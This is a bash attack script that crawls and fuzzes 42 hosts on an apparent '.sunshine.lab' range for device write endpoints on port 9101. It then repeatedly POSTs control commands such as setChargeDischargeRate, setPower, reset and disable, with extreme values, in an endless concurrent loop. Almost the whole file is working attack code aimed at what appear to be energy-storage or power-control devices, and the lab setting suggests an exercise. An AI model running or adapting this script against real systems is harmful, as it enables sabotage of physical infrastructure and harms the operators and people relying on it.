#!/usr/bin/env bash
set -euo pipefail

# ========== CONFIG ==========
: "${CRAWL_DEPTH:=2}"         # katana crawl depth
: "${CRAWL_THREADS:=10}"      # katana threads
: "${ATTACK_CONCURRENCY:=20}" # concurrent curls during attack
: "${FFUF_THREADS:=50}"       # ffuf threads
: "${TIMEOUT:=5}"             # per-request timeout (seconds)

# Infinite loop controls
: "${LOOP_SLEEP:=1}"          # seconds between full passes of all endpoints
: "${PRINT_STATUS:=1}"        # 1=echo each cmd/status in the loop, 0=quiet

SUCCESS_CODES="200,201,202,204"

HOSTS=(
  115010_1.sunshine.lab 11933_1.sunshine.lab 12618_1.sunshine.lab 129064_1.sunshine.lab
  170879_1.sunshine.lab 170879_2.sunshine.lab 170879_3.sunshine.lab 180093_1.sunshine.lab
  197295_1.sunshine.lab 197295_2.sunshine.lab 218212_1.sunshine.lab 219255_1.sunshine.lab
  229321_1.sunshine.lab 229321_2.sunshine.lab 23156_1.sunshine.lab 281301_1.sunshine.lab
  281301_2.sunshine.lab 281301_3.sunshine.lab 288490_1.sunshine.lab 288490_2.sunshine.lab
  357101_1.sunshine.lab 357101_2.sunshine.lab 357101_3.sunshine.lab 404945_1.sunshine.lab
  404945_2.sunshine.lab 405914_1.sunshine.lab 406755_1.sunshine.lab 420644_1.sunshine.lab
  437325_1.sunshine.lab 459711_1.sunshine.lab 459711_2.sunshine.lab 464636_1.sunshine.lab
  46648_1.sunshine.lab 494283_1.sunshine.lab 494283_2.sunshine.lab 506556_1.sunshine.lab
  506556_2.sunshine.lab 52401_1.sunshine.lab 533874_1.sunshine.lab 539175_1.sunshine.lab
  63786_1.sunshine.lab 71175_1.sunshine.lab
)

# Optional: packet capture (requires sudo)
: "${ENABLE_PCAP:=0}"
PCAP_IFACE="${PCAP_IFACE:-eth0}"
PCAP_FILE="${PCAP_FILE:-crawl_attack.pcap}"

# ========== DEP CHECK ==========
need() { command -v "$1" >/dev/null 2>&1 || { echo "Missing '$1' — install it."; exit 1; }; }
need curl; need awk; need sed; need grep; need sort; need uniq; need xargs
need katana; need ffuf

# ========== WORDLISTS (for fallback ffuf) ==========
ACTIONS_FILE="actions.txt"
VALUES_FILE="values.txt"

[[ -f "$ACTIONS_FILE" ]] || cat > "$ACTIONS_FILE" <<'EOF'
setChargeDischargeRate
setMode
setPower
setState
enable
disable
reset
EOF

[[ -f "$VALUES_FILE" ]] || cat > "$VALUES_FILE" <<'EOF'
-10
-1
0
1
10
100
9999
EOF

# ========== PREP ==========
mkdir -p crawl/ discovered/ attack/ logs/
ALL_ENDPOINTS="discovered/_all.endpoints"
: > "$ALL_ENDPOINTS"

# Optional PCAP
if [[ "$ENABLE_PCAP" == "1" ]]; then
  echo "[*] Starting tcpdump on $PCAP_IFACE -> $PCAP_FILE"
  sudo tcpdump -i "$PCAP_IFACE" -w "$PCAP_FILE" "port 9101" >/dev/null 2>&1 &
  TCPDUMP_PID=$!
fi

cleanup() {
  echo
  echo "[*] Caught exit, cleaning up..."
  if [[ "${TCPDUMP_PID:-}" ]]; then
    echo "[*] Stopping tcpdump (PID $TCPDUMP_PID)"
    kill "$TCPDUMP_PID" || true
  fi
  exit 0
}
trap cleanup INT TERM

# ========== FUNCTIONS ==========
crawl_host() {
  local host="$1"
  local base="http://$host:9101"
  local out="crawl/${host}.txt"
  echo "[*] Crawling $base (depth=$CRAWL_DEPTH, threads=$CRAWL_THREADS)"
  katana -u "$base" -d "$CRAWL_DEPTH" -t "$CRAWL_THREADS" \
    -silent -em js,json,txt,html -o "$out" || true
  echo "$out"
}

# Pattern: /api/v1/write/<device>.<action>/<value>
extract_write_endpoints() {
  local host="$1" dev="$2"
  local crawl_file="crawl/${host}.txt"
  local out_file="discovered/${host}.endpoints"
  grep -E "http://$host:9101/.+" "$crawl_file" 2>/dev/null | \
    grep -E "/api/v1/write/${dev}\.[A-Za-z0-9_]+/[A-Za-z0-9._+-]+" | \
    sort -u > "$out_file" || true
  echo "$out_file"
}

ffuf_discover() {
  local host="$1" dev="$2"
  local out_file="discovered/${host}.endpoints"
  echo "[*] Falling back to ffuf discovery for $host (device=$dev)"
  ffuf -ac -t "$FFUF_THREADS" -timeout "$TIMEOUT" \
    -w "$ACTIONS_FILE":ACT -w "$VALUES_FILE":VAL \
    -u "http://$host:9101/api/v1/write/${dev}.ACT/VAL" \
    -X POST -fc 404 -mc "$SUCCESS_CODES" \
    -of csv -o "logs/${host}.ffuf.csv" >/dev/null 2>&1 || true

  if [[ -s "logs/${host}.ffuf.csv" ]]; then
    awk -F, '
      NR==1 { for (i=1;i<=NF;i++){ if($i=="url") u=i; } next }
      u { print $u }
    ' "logs/${host}.ffuf.csv" | sort -u > "$out_file"
  fi
  echo "$out_file"
}

# One-time *coordinated* attack to verify (kept for artifacts)
attack_endpoints_once() {
  local host="$1" list="$2" results_csv="attack/${host}.results.csv"
  if [[ ! -s "$list" ]]; then echo "[!] No endpoints for $host"; return; fi
  echo "host,url,status,ms" > "$results_csv"
  echo "[*] Coordinated POST on $(wc -l < "$list") endpoints for $host"
  cat "$list" | xargs -I{} -P "$ATTACK_CONCURRENCY" bash -lc '
    URL="{}"
    HOSTNAME=$(echo "$URL" | awk -F/ "{print \$3}" | awk -F: "{print \$1}")
    START=$(date +%s%3N 2>/dev/null || python3 - <<PY
import time; print(int(time.time()*1000))
PY
)
    CODE=$(curl -sS -m '"$TIMEOUT"' -o /dev/null -w "%{http_code}" -X POST "$URL" || echo "000")
    END=$(date +%s%3N 2>/dev/null || python3 - <<PY
import time; print(int(time.time()*1000))
PY
)
    MS=$((END-START))
    echo "$HOSTNAME,$URL,$CODE,$MS" >> "'"$results_csv"'"
  '
  echo "[*] Results -> $results_csv"
}

# ========== MAIN (discover once, then loop forever) ==========
for H in "${HOSTS[@]}"; do
  DEV="${H%%.*}"
  CRAWL_FILE=$(crawl_host "$H")
  DISC_FILE=$(extract_write_endpoints "$H" "$DEV")

  if [[ ! -s "$DISC_FILE" ]]; then
    echo "[*] No write endpoints from crawl for $H; trying ffuf..."
    DISC_FILE=$(ffuf_discover "$H" "$DEV")
  else
    echo "[*] Crawl found $(wc -l < "$DISC_FILE") candidate endpoints for $H"
  fi

  # Save per-host artifact & append to global list
  if [[ -s "$DISC_FILE" ]]; then
    cat "$DISC_FILE" >> "$ALL_ENDPOINTS"
    attack_endpoints_once "$H" "$DISC_FILE"
  fi
done

# Build unique list for the infinite loop
sort -u -o "$ALL_ENDPOINTS" "$ALL_ENDPOINTS"

if [[ ! -s "$ALL_ENDPOINTS" ]]; then
  echo "[!] No endpoints discovered. Exiting."
  cleanup
fi

echo "[*] Entering infinite loop over $(wc -l < "$ALL_ENDPOINTS") endpoints… (sleep ${LOOP_SLEEP}s between passes)"
while :; do
  if [[ "$PRINT_STATUS" == "1" ]]; then
    while read -r URL; do
      echo ">> POST $URL"
      curl -sS -m "$TIMEOUT" -o /dev/null -w "HTTP %{http_code}\n" -X POST "$URL" || echo "HTTP 000"
    done < "$ALL_ENDPOINTS"
  else
    # Quiet mode with concurrency
    cat "$ALL_ENDPOINTS" | xargs -I{} -P "$ATTACK_CONCURRENCY" bash -lc \
      'curl -sS -m '"$TIMEOUT"' -o /dev/null -X POST "{}" || true'
  fi
  sleep "$LOOP_SLEEP"
done
